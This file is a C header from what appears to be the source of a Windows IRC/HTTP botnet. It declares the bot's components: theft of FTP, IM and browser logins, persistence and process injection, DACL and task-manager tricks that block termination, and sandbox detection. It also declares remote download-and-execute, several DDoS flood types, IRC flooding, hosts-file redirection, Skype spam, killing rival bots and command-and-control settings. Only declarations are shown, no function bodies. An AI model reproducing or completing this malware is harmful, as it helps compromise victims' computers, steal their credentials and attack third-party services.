#include <time.h>
#include <stdio.h>
//#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <Wininet.h>
#include <Lm.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <process.h>
#include <Aclapi.h>
//#include <Mstcpip.h>
//#include <Rpc.h>
#include <Commctrl.h>

#include "defines.h"
#include "../Other/DynamicLinking.h"
#include "../Other/MD5.h"

//Dynamic Linking
bool            DynamicLoadLibraries();

#ifdef INCLUDE_SOCKS4
//Socks4.cpp
typedef struct _SOCKS4
{
    char            version;
    char            cmd;
    unsigned short  usPort;
    unsigned long   ulAddr;
} SOCKS4, *LPSOCKS4;
#endif
/*
unsigned short usPort = random() % 65535;

SOCKS4 socks;
socks.uPort = usPort;

sockaddr_in socksaddr;
socks.remote = &socksaddr;

DWORD dwThreadID;
CreateThread(0,0,fServerThread,(PVOID)&socks,0,&dwThreadID);
*/

//Initial setup of config info
bool            SetupInfo();

//Random Seed for srand()
unsigned long   GenerateRandomSeed();

//Recovery
#ifndef HTTP_BUILD
#ifdef INCLUDE_RECOVERY
DWORD WINAPI    RecoverFtp(LPVOID);
void            SendFtpLogins(char *pcClient, char *pcHost, char *pcUser, char*pcPass);
DWORD WINAPI    RecoverIm(LPVOID);
void            SendImLogins(char *pcClient, char *pcUser, char*pcPass);
void            SendBrowserLogins(char *pcClient, char *pcUrl, char *pcUser, char*pcPass);
#endif
#endif

//Install, persistence, and removal related
#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
void            StartInstallPersist();
#endif
void            UninstallProgram();

//Connect to hub server/network
void            ConnectToHub();
#ifdef HTTP_BUILD
bool            SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData);
bool            SendHttpCommandResponse(int nTaskId, char *cReturnParameter);
#endif

//Base64 stuff
size_t          base64_decode(const char *source, char *target, size_t targetlen);
int             base64_encode(unsigned char *source, size_t sourcelen, char *target, size_t targetlen);

//RC4
int             rc4(const char *szData, int nDataLength, const char *szKey, char *cOutput);

//XOR
char *SimpleDynamicXor(char *pcString, DWORD dwKey);

//Encrypted Command
#ifndef HTTP_BUILD
void            SendEncryptedCommandFailed();
#endif

//Skype Mass Messenger
#ifdef INCLUDE_SKYPE_MASS_MESSENGER
bool            SkypeExists(char *pcOutBuffer, int nBufferSize);
int             MassMessageSkypeContacts(const char *cSkypePath, const char *cMessage);
void            SendSkypeMessagesSent(int nSentMessages);
#endif

//Parse processed raw commands
void            ParseCommand(char *cCommand);
#ifdef HTTP_BUILD
bool            ParseHttpLine(char *cMessage);
bool            IsValidHttpResponse(char *cHttpResponse);
#endif

//Packet sniff
//void            StartPacketSniffer();
//void            StopPacketSniffer();

//Dacl
void            RemoteDaclProtection(DWORD dwPid);
void            ProtectByModifyingDacl(); //Modifies object security to disallow terminating of the process by other processes that are not administrator
bool            SetFilePrivileges(LPTSTR cFilePathName, DWORD dwPermissions, bool bDenyOrNot);

//File Search Engine
#ifndef HTTP_BUILD
#ifdef INCLUDE_FILESEARCH
DWORD WINAPI    FileSearch(LPVOID);
void            SendFileSearchStopped(char *pcSearchParameter);
void            SendFailedToSearch();
void            SendSearchAlreadyRunning();
void            SendFileSearchSuccess(unsigned long ulFilesSeached, unsigned long ulFileMatches, char *pcSearchParameter);
void            SendSearchedFile(char *pcSearchParameter, char *cFile);
#endif
#endif

//Download, execute, and update
DWORD WINAPI    DownloadExecutableFile(LPVOID);
#ifndef HTTP_BUILD
void            SendDownloadScheduleNotification(DWORD dwSeconds, char *cFileDownloadUrl, bool bUpdateToFile);
void            SendFailedToWrite(char *cFileDownloadUrl);
void            SendDownloadAndExecuteWithArgumentsSuccess(char *cFileDownloadUrl, char *cArguments, char *szMd5Hash);
void            SendDownloadAndExecuteSuccess(char *cFileDownloadUrl, char *szMd5Hash);
void            SendMd5NotMatch(char *szMd5_1, char *szMd5_2);
void            SendMd5MatchesCurrent(char *szMd5_1, char *szMd5_2);
void            SendDownloadSuccessAndExecuteFail(char *cFileDownloadUrl, char *szMd5Hash);
void            SendMd5Hash(char *szFileDownloadUrl, char *szMd5Hash);
void            SendDownloadFail(char *cFileDownloadUrl);
void            SendDownloadAbort(DWORD dwSeconds, char *cUrl);
void            UninstallForUpdate(char *szMd5);
#endif

//Mutex utilities
//bool            UnSetProgramMutex(char *cValue);
bool            SetProgramMutex(char *cValue);
bool            CheckProgramMutexExistance(char *cValue);

//Decrypt IP
#ifdef USE_ENCRYPTED_IP
char            *DecryptIp(char *pcIp, unsigned short usChecksum);
#endif

#ifdef INCLUDE_DDOS
//Ddos related stuff
void            StartNonBlockingDdosTimer();
DWORD WINAPI    DdosUdp(LPVOID);
DWORD WINAPI    DdosCondis(LPVOID);
DWORD WINAPI    DdosGetPostArme(LPVOID);
DWORD WINAPI    DdosSlowlorisRudy(LPVOID);
DWORD WINAPI    BandwithDrain(LPVOID);
DWORD WINAPI    DdosSlowPost(LPVOID);
bool            HandleDdosCommand(char *cCommand, char *cTargetUrl, unsigned short usTargetPort, unsigned int uiFloodLength);
#ifndef HTTP_BUILD
void            SendDdosResult(bool bResult, char *pcCommand, char *pcTargetUrl, unsigned short usTargetPort, DWORD dwAttackLength);
void            SendHttpDdosStop(bool bPacketAccountable, DWORD dwPackets, DWORD dwLength);
void            SendSockDdosStop(bool bPacketAccountable, DWORD dwPacketsOrEstablishedConnections, DWORD dwLength);
#endif

//Browser based DDoS
DWORD WINAPI    MassBrowserDdos(LPVOID);
#ifndef HTTP_BUILD
void            SendBrowserDdosSuccess(char *cHost, DWORD dwLength, char *cBrowser);
void            SendBrowserDdosStop(char *cHost);
void            SendBrowserDdosFail(char *cHost);
#endif
#endif

//Http related
char            *GenerateHttpPacket(unsigned short usType, char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData);
char            *SendHttpRequest(unsigned short usType, char *cHttpUrl, unsigned short usHttpPort);
DWORD WINAPI    GetWebsiteStatus(LPVOID);
#ifndef HTTP_BUILD
void            SendWebsiteStatus(char *pcUrl, char *pcStatus);
#endif

//Miscellaneous Utilities
void            ResolveMicrosoftUpdateDomain();
void            DefineInitialVariables();
bool            DnsFlushResolverCache();
char            *GenerateRandomBase64Data(unsigned short usLength);
char            *GenerateFilename(short sOffset);
unsigned long   GetHash(unsigned char *str);
unsigned long   GetRandNum(unsigned long range);
char            *GenRandLCText();
char            *GenerateRandomIp();
char            *GenerateRandomPort();
char            *GenerateRandomFriendlyFilename();
void            RunThroughUuidProcedure();

//Sandbox Check
bool            IsRunningInSandbox();

//Processes stuff
DWORD           StartProcessFromPath(char *cPath, bool bHidden);
BOOL            AdjustPrivileges(BOOL bEnabled);
bool            KillProcessByPid(DWORD dwPid, bool bKillChildren);
DWORD           GetPidFromFilename(LPTSTR szExe);
DWORD           GetParentProcessPid();
int             GetPathFromPid(DWORD dwPid, char *cPathOut);
bool            IsProcessRunning(char *pcExeName);

//Lock computer
#ifdef INCLUDE_LOCK
void            LockComputer();
void            UnLockComputer();
bool            ShowWindows(bool bShow);
#ifndef HTTP_BUILD
void            SendComputerLocked();
void            SendComputerUnLocked();
#endif
#endif

//Blocking Timer
unsigned int    BlockingTimer(unsigned int uiSeconds);

//Process Strings
char            *GetIframe(char *pcIframe);
char            *FindInString(char *cFullString, char *cBefore, char *cAfter);
void            strtr(char *cSource, char *cCharArrayA, char *cCharArrayB);
char            *CharacterReplace(char *pcString, char *cParameter1, char *cParameter2);
void            StripAsterisks(char *pcString);
char            *StripReturns(char *pcString);
void            StripDashes(char *pcString);
char            *StripQuotes(char *pcString);
//char            *GetPathWithoutDriveFromFilePath(char *cFile);
//char            *GetDirectoryFromFilePath(char *cFile);
//char            *GetFileNameFromFilePath(char *cFile);

//IRC Utilities
char            *GetOs();
#ifndef HTTP_BUILD
char            *NewRandomNick();
void            SendToIrc(char *cIrcRaw);
void            ParseLineFromIrc(char *cIrcRaw);
void            SyncIrcVariables();
bool            IsValidIrcMotd(char *pcRaw);

//IRC War
#ifdef INCLUDE_IRCWAR
void            StartIrcWar(char *cWarHost, unsigned short usWarPort);
DWORD WINAPI    ConnectionsToRemoteIrc(LPVOID);
char            *GenerateRandomIrcNameString();
char            *GenerateCtcp(bool bDcc);
char            *GenerateRandomIrcClientVersion();
char            *GenerateRegisterQuery(char *pcNickname);
char            *GenerateWarNickname();
char            *GenerateRandomHelpMessageToAnope();
bool            SendToWarIrc(char *pcSendData, DWORD dwSocket);
bool            SendToAllWarIrcConnections(char *pcSendData);
void            SetWarStatusIdle();
DWORD WINAPI    SendWarInvites(LPVOID);
void            SendCtcpToWarIrc(char *pcTargetNickname, bool bDcc);
void            AttemptToRegisterWithNickServ(DWORD dwSocket);
void            SetNewWarNicknames();
void            SendSuccessfulStartedAttemptedRemoteIrcConnections(char *pcHost, DWORD dwPort);
void            SendDisconnectedFromRemoteIrcConnections(char *pcHost, DWORD dwPort);
void            SendSuccessfulWarSubmit(char *pcType);
void            SendWarFloodStarted(char *pcType, char *pcTarget);
void            SendWarFloodStopped(char *pcType, char *pcTarget);
void            SendWarStatus(DWORD dwValidatedConnections, char *pcStatus);
void            SendKillUser(char *pcTarget);
void            SendKillMultipleUsers(char *pcParam);
void            SendKillMultipleUsersStop();
void            SendSuccessfulRegisterNickname(DWORD dwSocket);
void            SendAbortRegisterNickname();
void            StartAnopeFlood();
void            StartChannelFlood(bool bHop, char *pcParam);
void            StartUserFlood(bool bMulti, char *pcParam);
void            DisconnectFromWarIrc();
DWORD WINAPI    RegisterWithWarIrc(LPVOID);
#endif
#endif

//Handles Files
void            DeleteZoneIdentifiers();
bool            AppendToFile(char *cFile, char *cStringToAdd);
char            *GetContentsFromFile(char *cFile);
bool            FileExists(LPSTR lpszFilename);
bool            HideFile(char *pcFile);
bool            SetFileNormal(char *cFile);
bool            IsFileSystemOrHidden(const char *cFileName);
bool            DirectoryExists(const char *cDirName);

//Restarts Explorer
bool            CreateRestartExplorer();

//HOSTS file modification
#ifndef HTTP_BUILD
#ifdef INCLUDE_HOSTBLOCK
void            SendSuccessfullyRestoredHostsFile();
void            SendSuccessfullyBlockedHost(char *cHost);
void            SendSuccessfullyRedirectedHost(char *cOriginalHost, char *cRedirectToHost);
bool            RestoreHostsFile();
bool            BlockHost(char *cHost);
bool            RedirectHost(char *cOriginalHost, char *cRedirectToHost);
#endif
#endif

//Auto-spread
//DWORD WINAPI    UsbSpread(LPVOID);

//Computer Info Utilities
bool            IsLaptop();
bool            Is64Bits(HANDLE hProcess);
bool            IsAdmin();
bool            SetOperatingSystem();
char            *GetIdleTime();
char            *GetUptime();
DWORD           GetMemoryLoad();
DWORD_PTR       GetNumCPUs();
bool            CheckIfExecutableIsNew();
char            *GetCountry();
char            *GetVersionMicrosoftDotNetVersion();

//Registry
bool            CheckIfRegistryKeyExists(HKEY hKeyClass, char *cSubKey, char *cKeyName);
bool            DeleteRegistryKey(HKEY hKeyClass, char *cSubKey, char *cKeyName);
bool            CreateRegistryKey(HKEY hKeyClass, char *cSubKey, char *cKeyName, char *cKeyValue);
char            *ReadRegistryKey(HKEY hKeyClass, char *cSubKey, char *cKeyName);

//Ftp related
#ifndef HTTP_BUILD
#ifdef INCLUDE_FILESEARCH
DWORD WINAPI    FtpUploadFile(LPVOID);
void            SendFailedToOpenInternetConnection();
void            SendSuccessfulFileUpload(char *cOriginalFile, char *cUploadedFile);
void            SendFailedToFileUpload();
void            SendFailedToConnect();
#endif
#endif

//Send Invalid Parameters and Thread Creation fail to HUB
#ifndef HTTP_BUILD
void            SendThreadCreationFail();
void            SendInvalidParameters();
#endif

//Process Persistence
void            MutexHandler();

//Injected Process Persistance
#ifdef INCLUDE_INJECTION
int             InjectAllProcesses();
void            StartInjectedThreads();

//Injection struct
typedef struct __vInjectInfo
{
    WORD    wSizeOf;
    DWORD   dwParam;
    DWORD   dwLoadLibraryA;
    DWORD   dwGetProcAddress;

    char    szUser32Name[32];
    char    szMessageBoxAName[32];

    char    szNtDllName[32];
    char    szNtTerminateProcessName[32];

    char    szKernel32Name[32];
    char    szOpenMutexAName[32];
    //char    szCreateMutexAName[32];
    //char    szReleaseMutexName[32];
    char    szCloseHandleName[32];
    char    szSleepName[32];
    //char    szGetLastErrorName[32];

    char    szShell32Name[32];
    char    szShellExecuteAName[32];

    char    szSavedFilePath[MAX_PATH];

    DWORD   dwDelay;
    char    szInjectedProcessMutex[MAX_PATH + 50];
    char    szMainInstanceMutexValue[32];
    char    szUninstallationMutexValue[32];
    //char    szBackupMutex[DEFAULT];
} INJECTINFO, *LPINJECTINFO;
#else
//Sister Process Persistance
#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
void            StartSisterProcessFromMainInstance();
void            SisterProcessFromBackupInstanceMainBlockingLoop();
void            StartMonitorBackupProcessFromRecoveredInstance();
#endif
#endif

//Shell command submitted
#ifndef HTTP_BUILD
void            SendShellCommandSubmitted(char *pcCommand);
#endif

//Process Arguments
void            ProcessArgcs(int argc, char *argv[]);

//Website visit related
void            DefineBrowsers();
char            *CheckBrowserType(unsigned short usBrowser);
#ifdef INCLUDE_VISIT
char            *SimpleVisit(char *cUrl, bool bHidden);
bool            SmartView();
#ifndef HTTP_BUILD
void            SendSimpleVisitSuccess(char *pcUrl, char *pcBrowser, bool bHidden);
void            SendWebsiteOpenFail(char *cUrl);
void            SendWebsiteOpenConfirmation(char *cBrowser, unsigned int uiSecondsBefore, unsigned int uiSecondsAfter, char *cUrl);
void            SendWebsiteCloseConfirmation(char *cBrowser, unsigned int uiSeconds, char *cUrl);
void            SendWebsiteScheduleConfirmation(char *cBrowser, unsigned int uiSeconds, char *cUrl);
void            SendClearSmartViewQueue(unsigned int uiEntries);
void            SendDeletedEntry(char *cEntry);
#endif

DWORD WINAPI    VisitWebsite(LPVOID);
#ifndef HTTP_BUILD
void            SendWebsiteOpenFail(char *cUrl);
void            SendWebsiteCloseConfirmation(unsigned int uiSeconds, char *cUrl);
void            SendWebsiteOpenConfirmation(char *cBrowser, unsigned int uiSecondsBefore, unsigned int uiSecondsAfter, char *cUrl);
void            SendWebsiteScheduleConfirmation(unsigned int uiSeconds, char *cUrl);
#endif
#endif

//Functions related to protection of the executable
//bool            IsNonDesirableEnvironment();
void            StartProactiveFunctions();

//Task manager tricks (process protection related)
void            DisableTaskManagerAllUsersButton();
void            ProtectByModifyingDacl();

//Browser related
char            *CheckBrowserType(unsigned short usBrowser);
unsigned short  GetBrowserNumberFromPath(char *cBrowser);

//Botkiller
#ifdef INCLUDE_BOTKILL
bool            BreakFile(char *cFilename);
void            StartBotkiller();
void            StopBotkiller();
#ifndef HTTP_BUILD
void            SendBotkillerStarted();
void            SendBotkilledOneCycle(DWORD dwKills, DWORD dwFiles, DWORD dwKeys);
void            SendBotkillerStopped();
void            SendBotkillCount(DWORD dwKills, DWORD dwFiles, DWORD dwKeys);
void            SendBotkillCleared();
#endif
#endif

#ifdef USE_SSL
BOOL            DoAuthentication(SOCKET s);
#endif

//Info
extern char            cRegistryKeyAccess[5];
extern DWORD           dwOperatingSystem;

//Botkiller
extern DWORD            dwKilledProcesses;
extern DWORD            dwFileChanges;
extern DWORD            dwRegistryKeyChanges;
extern bool             bBotkill;
//Under here is one-cycle stuff
extern bool            bBotkillOnce;
extern DWORD           dwKilledProcessesSaved;
extern DWORD           dwFileChangesSaved;
extern DWORD           dwRegistryKeyChangesSaved;
extern bool            bBotkillInitiatedViaCommand;

//Lock Computer
extern bool             bLockComputer;

//Packet sniff
extern bool             bPacketSniffing;

//Utility Variables
extern char            cZoneIdentifierSuffix[25];
extern bool            bComputerXpOrUnder;
extern char            cFileSaved[MAX_PATH];
extern char            cFileSavedDirectory[MAX_PATH];
extern char            cThisFile[MAX_PATH];
extern unsigned long   ulFileHash;
extern char            cFileHash[10];
extern char            cBuild[DEFAULT];
extern char            cStoreParameter[DEFAULT];
extern bool            bStoreParameter;
extern bool            bStoreParameter2;
extern DWORD           dwStoreParameter;
extern char            cMainProcessMutex[DEFAULT];
extern char            cBackupProcessMutex[DEFAULT];
extern char            cUninstallProcessMutex[DEFAULT];
extern char            cUpdateMutex[DEFAULT];
extern char            cHostsPath[MAX_PATH];
extern char            cReturnNewline[3];
extern char            cRegistryKeyToCurrentVersion[MAX_PATH];
extern int             nBootType;

//Ftp related
extern char            cFtpUser[DEFAULT];
extern char            cFtpPass[DEFAULT];
extern char            cFtpHost[DEFAULT];

//Booleans
extern bool            bPersist;
extern bool            bSilent;
extern bool            bUninstallProgram;
extern bool            bNewInstallation;
extern bool            bRecoveredProcess;

//Download, execute, and update related
extern char            cDownloadFromLocation[DEFAULT];
extern bool            bUpdate;
extern bool            bDownloadAbort;
extern bool            bExecutionArguments;
extern bool            bGlobalOnlyOutputMd5Hash;
extern bool            bMd5MustMatch;
extern char            szMd5Match[DEFAULT];

//Browser related
extern char            cBrowsers[5][DEFAULT];

//Startup Paths
extern char            cAllUsersStartupDirectory[MAX_PATH];
extern char            cUserStartupDirectory[MAX_PATH];
extern char            cAppData[MAX_PATH];
extern char            cTempDirectory[MAX_PATH];
extern char            cUserProfile[MAX_PATH];
extern char            cAllUsersProfile[MAX_PATH];
extern char            cProgramFiles[MAX_PATH];

//Windows Directory
extern char            cWindowsDirectory[MAX_PATH];

//File Search
extern unsigned long   ulTotalFiles;
extern unsigned long   ulMatchingFiles;
extern bool            bOutputFileSearch;
extern unsigned int    uiTotalContainingIframeContents;
extern bool            bBusyFileSearching;

//Website visit
extern unsigned int    uiSecondsBeforeVisit;
extern unsigned int    uiSecondsAfterVisit;
extern DWORD           dwSmartViewCommandType;
extern unsigned int    uiWebsitesInQueue;

//Config
extern char            cVersion[DEFAULT];
extern char            cServer[DEFAULT];
extern char            cBackup[DEFAULT];
extern char            cServers[10][MAX_PATH];
extern unsigned short  usPort;
extern char            cChannel[DEFAULT];
extern char            cChannelKey[DEFAULT];
extern char            cAuthHost[DEFAULT];
extern char            cOwner[DEFAULT];
extern char            cServerPass[DEFAULT];

//IRC hub management
extern unsigned int    nIrcSock;
extern char            cSend[MAX_IRC_SND_BUFFER];
extern char            cReceive[MAX_IRC_RCV_BUFFER];
extern DWORD           dwConnectionReturn;
extern char            cNickname[DEFAULT];
extern char            *pcParseLine;
extern char            *pcPartOfLine;
extern char            cIrcMotdOne[DEFAULT];
extern char            cIrcMotdTwo[DEFAULT];
extern char            cIrcJoinTopic[DEFAULT];
extern char            cIrcSetTopic[DEFAULT];
extern char            cCommandToChannel[DEFAULT];
extern char            cCommandToMe[DEFAULT];
extern bool            bAutoRejoinChannel;
extern char            cIrcResponseOk[10];
extern char            cIrcResponseErr[10];

//HTTP hub management
extern char            cUuid[44];
extern int             nCheckInInterval;
extern bool            bHttpRestart;
extern int             nCurrentTaskId;
extern int             nUninstallTaskId;
extern char            cHttpHostGlobal[MAX_PATH];
extern char            cHttpPathGlobal[MAX_PATH];
extern SOCKADDR_IN     httpreq;

//Flood related
extern bool            bDdosBusy;
extern DWORD           dwHttpPackets;
extern DWORD           dwSockPackets;
extern char            cFloodHost[DEFAULT];
extern char            cFloodPath[DEFAULT];
extern char            cFloodData[DEFAULT];
extern unsigned short  usFloodPort;
extern unsigned short  usFloodType;
extern bool            bBrowserDdosBusy;

//Irc War related
extern char            cRemoteHost[DEFAULT];
extern unsigned short  usRemotePort;
extern unsigned short  usRemoteAttemptConnections;
extern unsigned short  usRemoteSuccessfulConnections;
extern bool            bRemoteIrcBusy;
extern SOCKET          sWar[MAX_WAR_CONNECTIONS];
extern DWORD           dwOpenSockets;
extern char            cRegisterQueryString[DEFAULT];
extern DWORD           dwValidatedConnectionsToIrc;
extern char            cCurrentWarStatus[100];
extern bool            bWarFlood;
extern char            cWarFloodTargetParam[DEFAULT];
extern bool            bNicknameRegisterTimer;
extern bool            bRegisterOnWarIrc;

//Base 64 characters
extern char            cBase64Characters[64];

//Checksums/CRC/Setup/Config/etc
extern unsigned long ulChecksum1;
extern unsigned long ulChecksum2;
extern unsigned long ulChecksum3;
extern unsigned long ulChecksum4;
extern unsigned long ulChecksum5;
extern unsigned long ulChecksum6;
extern unsigned long ulChecksum7;
extern unsigned long ulChecksum8;
extern unsigned long ulChecksum9;

//extern int nPortOffset;

extern unsigned short usVersionLength;
extern unsigned short usServerLength;
extern unsigned short usChannelLength;
extern unsigned short usChannelKeyLength;
extern unsigned short usAuthHostLength;
extern unsigned short usServerPassLength;

extern unsigned short usConfigStrlenKey;

extern char cIrcCommandPrivmsg[8];
extern char cIrcCommandJoin[5];
extern char cIrcCommandPart[5];
extern char cIrcCommandUser[5];
extern char cIrcCommandNick[5];
extern char cIrcCommandPass[5];
extern char cIrcCommandPong[5];

extern bool bConfigSetupCheckpointOne;
extern bool bConfigSetupCheckpointTwo;
extern bool bConfigSetupCheckpointThree;
extern bool bConfigSetupCheckpointFour;
extern bool bConfigSetupCheckpointFive;
extern bool bConfigSetupCheckpointSix;
extern bool bConfigSetupCheckpointEight;
extern bool bConfigSetupCheckpointSeven;
extern bool bConfigSetupCheckpointNine;
extern bool bConfigSetupCheckpointTen;

extern int nExpirationDateMedian;
